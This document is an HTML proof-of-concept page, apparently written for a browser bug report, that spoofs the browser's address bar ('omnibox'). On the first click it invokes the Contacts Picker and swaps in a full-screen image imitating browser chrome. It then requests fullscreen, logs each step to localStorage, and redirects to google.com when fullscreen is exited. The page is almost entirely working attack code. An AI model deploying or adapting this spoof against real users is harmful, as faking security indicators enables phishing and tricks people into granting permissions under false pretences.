<!DOCTYPE html>
<html lang="en">
<head>
  <title>Security UI Spoof</title>
  <meta charset="utf-8">
  <meta name="viewport"
        content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no"/>

  <style>
    html, body {
      margin: 0;
      padding: 0;
      width: 100%;
      height: 100%;
      background: #000;
      font-family: sans-serif;
      overflow: hidden;
    }

    #spoof {
      position: fixed;
      inset: 0;
      width: 100vw;
      height: 100vh;
      object-fit: cover;
      display: none;
      z-index: 9999;
    }

    #content {
      position: absolute;
      inset: 0;
      display: flex;
      align-items: center;
      justify-content: center;
      color: #fff;
      text-align: center;
    }
  </style>
</head>

<body>

<img id="spoof" src="spof2.png" alt="spoof">

<div id="content">
  <h1>Click anywhere on the page to spoof the omnibox!</h1>
</div>

<script>
let enteredFullscreen = false;

/* ðŸ§¾ Simple logger */
function logEvent(type, data = {}) {
  const logs = JSON.parse(localStorage.getItem('poc_logs') || '[]');
  logs.push({
    time: new Date().toISOString(),
    type,
    ...data
  });
  localStorage.setItem('poc_logs', JSON.stringify(logs));
  console.log('[LOG]', type, data);
}

document.addEventListener('click', async () => {

  /* 1ï¸âƒ£ Call Contacts Picker */
  if (navigator.contacts && navigator.contacts.select) {
    logEvent('contacts_picker_called');

    navigator.contacts.select(["name"], {})
      .then(result => {
        logEvent('contacts_picker_closed', {
          granted: true,
          count: result.length
        });
      })
      .catch(err => {
        logEvent('contacts_picker_closed', {
          granted: false,
          reason: err.name
        });
      });
  } else {
    logEvent('contacts_api_not_supported');
  }

  /* 2ï¸âƒ£ Show spoof */
  document.getElementById('spoof').style.display = 'block';
  document.getElementById('content').style.display = 'none';

  /* 3ï¸âƒ£ Enter fullscreen */
  if (document.documentElement.requestFullscreen) {
    try {
      await document.documentElement.requestFullscreen();
      enteredFullscreen = true;
      logEvent('entered_fullscreen');
    } catch (e) {
      logEvent('fullscreen_failed', { error: e.message });
    }
  }

}, { once: true });

/* ðŸ” Exit fullscreen â†’ redirect */
document.addEventListener('fullscreenchange', () => {
  if (enteredFullscreen && !document.fullscreenElement) {
    logEvent('exit_fullscreen_redirect');
    location.href = 'https://google.com';
  }
});
</script>

</body>
</html>
